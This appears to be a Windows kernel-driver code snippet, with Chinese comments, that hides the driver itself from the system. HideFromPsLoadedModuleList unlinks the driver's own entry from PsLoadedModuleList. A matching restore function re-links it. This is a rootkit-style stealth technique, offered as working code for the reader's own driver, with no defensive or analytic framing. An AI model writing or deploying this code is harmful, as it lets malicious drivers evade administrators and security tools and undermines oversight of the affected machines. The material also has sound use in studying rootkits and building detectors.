NTSTATUS HideFromPsLoadedModuleList() {
    PLIST_ENTRY head = PsLoadedModuleList;   // 导出的 LIST_ENTRY 头
    for (PLIST_ENTRY p = head->Flink; p != head; p = p->Flink) {
        PKLDR_DATA_TABLE_ENTRY e = CONTAINING_RECORD(p, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (e->DllBase == g_DriverBase) {     // 你自己的 ImageBase
            g_pSelfEntry = e;                  // 备份，回滚时重新链回去
            RemoveEntryList(&e->InLoadOrderLinks);
            e->InLoadOrderLinks.Flink = e->InLoadOrderLinks.Blink = &e->InLoadOrderLinks;
            return STATUS_SUCCESS;
        }
    }
    return STATUS_NOT_FOUND;
}

// 回滚
VOID RestorePsLoadedModuleList() {
    if (!g_pSelfEntry) return;
    PLIST_ENTRY head = PsLoadedModuleList;
    InsertTailList(head, &g_pSelfEntry->InLoadOrderLinks);
}
